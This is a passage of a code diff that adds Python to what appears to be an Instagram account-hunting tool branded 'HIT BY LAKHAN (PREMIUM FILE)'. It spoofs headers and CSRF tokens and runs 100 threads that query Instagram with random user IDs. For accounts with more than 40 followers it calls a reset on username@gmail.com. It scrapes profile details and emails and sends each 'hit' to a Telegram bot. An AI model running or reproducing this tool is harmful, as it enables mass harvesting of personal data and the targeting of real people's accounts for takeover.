@@ -321,4 +321,157 @@ def tg(t,m,k,c,dec):
 	'sec-ch-ua-platform': '"Linux"',
 	'sec-ch-ua-platform-version': '""',
 	'sec-fetch-dest': 'empty',
-	'sec-fetch-mode': 'c
+	'sec-fetch-mode': 'cors',
+	'sec-fetch-site': 'same-origin',
+	'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+	'x-asbd-id': '359341',
+	'x-bloks-version-id': '446750d9733aca29094b1f0c8494a768d5742385af7ba20c3e67c9afb91391d8',
+	'x-csrftoken': 'WCu4eqffrttETY77lwfLp44ZUIISFWdF',
+	'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
+	'x-fb-lsd': 'lcECBEfHHpWwpjVs89xeT9',
+	'x-ig-app-id': '936619743392459',
+	'referer': f'https://www.instagram.com/{c}/',
+	}
+	params = {
+	'username': c,
+	}
+	try:
+		response = requests.get('https://www.instagram.com/api/v1/users/web_profile_info/', headers=headers, params=params)
+		data = response.text
+		js = response.json()
+		user_data = js.get('data', {}).get('user', {})
+		u = user_data.get('username', None)
+		fn = user_data.get('full_name', None)
+		b = user_data.get('biography', None)
+		f1 = user_data.get('edge_followed_by', {}).get('count', 0)
+		f2 = user_data.get('edge_follow', {}).get('count', 0)
+		p = user_data.get('is_private', None)
+		p1 = user_data.get('edge_owner_to_timeline_media', {}).get('count', 0)
+		biz = user_data.get('is_business_account', None)
+		if f1 > 10 and p1 > 3:
+			mm = 'True'
+		else:
+			mm = 'False'
+		msg = f"""
+┏━━━━━━𝐇𝐈𝐓 𝐁𝐘 𝐋𝐀𝐊𝐇𝐀𝐍 (𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐅𝐈𝐋𝐄)🔱🪬
+━━━━━━━┓
+🏢 𝗕𝘂𝘀𝗶𝗻𝗲𝘀𝘀       : {biz}
+🌐 𝗠𝗲𝘁𝗮 𝗘𝗻𝗮𝗯𝗹𝗲𝗱   : {mm}
+👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀      : {f1}
+➡️ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴     : {f2}
+📸 𝗣𝗼𝘀𝘁𝘀          : {p1}
+📝 𝗕𝗶𝗼           : {b}
+🔒 𝗣𝗿𝗶𝘃𝗮𝘁𝗲       : {p}
+🧾 𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲     : {fn}
+👤 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲      : @{c}
+📨 𝗘𝗺𝗮𝗶𝗹         : {k}
+🧪 𝗢𝗯𝗳𝘂𝘀 𝗘𝗺𝗮𝗶𝗹   : {z}
+🔗 𝗨𝗥𝗟           : https://www.instagram.com/{c}
+👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿     : @Lakhan_sharna 
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+"""
+	except:
+		msg = f"""
+┏━━━━━━𝐇𝐈𝐓 𝐁𝐘 𝐋𝐀𝐊𝐇𝐀𝐍 (𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐅𝐈𝐋𝐄)🔱🪬
+ ━━━━━━┓
+🏢 𝗕𝘂𝘀𝗶𝗻𝗲𝘀𝘀       : {biz}
+🌐 𝗠𝗲𝘁𝗮 𝗘𝗻𝗮𝗯𝗹𝗲𝗱   : {mm}
+👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀      : {f1}
+➡️ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴     : {f2}
+📸 𝗣𝗼𝘀𝘁𝘀          : {p1}
+📝 𝗕𝗶𝗼           : {b}
+🔒 𝗣𝗿𝗶𝘃𝗮𝘁𝗲       : {p}
+🧾 𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲     : {fn}
+👤 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲      : @{c}
+📨 𝗘𝗺𝗮𝗶𝗹         : {k}
+🧪 𝗢𝗯𝗳𝘂𝘀 𝗘𝗺𝗮𝗶𝗹   : {z}
+🔗 𝗨𝗥𝗟           : https://www.instagram.com/{c}
+👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿     : @Lakhan_sharma
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+"""
+	params = {
+	"chat_id": t,
+	"text": msg
+	}
+	requests.get(f'https://api.telegram.org/bot{m}/sendMessage', params=params)
+def csrf(legend):
+    while True:
+        try:
+            headers = {
+                'user-agent': "Instagram 311.0.0.32.118 Android (25/7.1.2; 420dpi; 1920x1080; Samsung; SM-G950F; dreamlte; exynos8895; en_US; 545986883)",
+                'x-ig-app-id': '936619743392459'
+            }
+            r = legend.get('https://www.instagram.com/', headers=headers, timeout=3)
+            token = r.cookies.get_dict().get('csrftoken', '')
+            if token:
+                with open("csrf.txt", "w") as f:
+                    f.write(token)
+                break
+        except:
+            pass
+def csrfX():
+    try:
+        with open("csrf.txt", "r") as f:
+            return f.read().strip()
+    except:
+        return ""
+def users():
+    primeXcxqok1 = requests.Session()
+    while True:
+        try:
+            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+            cookies = {
+                'rur': '"VLL\\05476944984014\\0541788877382:01feb9c5b489b4665ce93731c710cac36c78fdb4c176515a1e9a902103d9b08a5e1aef0f"'
+            }
+            headers = {
+                'User-Agent': "Instagram 311.0.0.32.118 Android (25/7.1.2; 420dpi; 1920x1080; Samsung; SM-G950F; dreamlte; exynos8895; en_US; 545986883)",
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                'sec-ch-ua-model': '"SM-A235F"',
+                'x-ig-app-id': '1217981644879628',
+                'sec-ch-ua-mobile': '?1',
+                'x-fb-friendly-name': 'QuickPromotionSupportIGSchemaBatchFetchQuery',
+                'x-fb-lsd': lsd,
+                'sec-ch-ua-platform-version': '"14.0.0"',
+                'x-asbd-id': '359341',
+                'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+                'sec-ch-prefers-color-scheme': 'light',
+                'x-csrftoken': csrfX(),
+                'sec-ch-ua-platform': '"Android"',
+                'origin': 'https://www.instagram.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://www.instagram.com/vihaantheking333/',
+                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            }
+            fvck = random.randint(2500000000, 21254029834)
+            data = {
+                'lsd': lsd,
+                'fb_api_caller_class': 'RelayModern',
+                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
+                'variables': json.dumps({"userID": fvck, "username": "cristiano"}),
+                'server_timestamps': 'true',
+                'doc_id': '7717269488336001',
+            }
+            r = primeXcxqok1.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data, timeout=10)
+            if r.status_code == 200:
+                j = r.json()
+                loda = j.get('data', {}).get('user', {})
+                if not loda:
+                    continue
+                u = loda.get('username')
+                f = loda.get('follower_count', 0)
+                if u and f > 40:
+                    reset(u+'@gmail.com')
+        except:
+            pass
+primeXcxqok = requests.Session()
+csrf(primeXcxqok)
+for i in range(100):
+    Thread(target=users).start()
+Thread(target=prime, daemon=True).start()
+while True:
+	time.sleep(1)
+	
+	
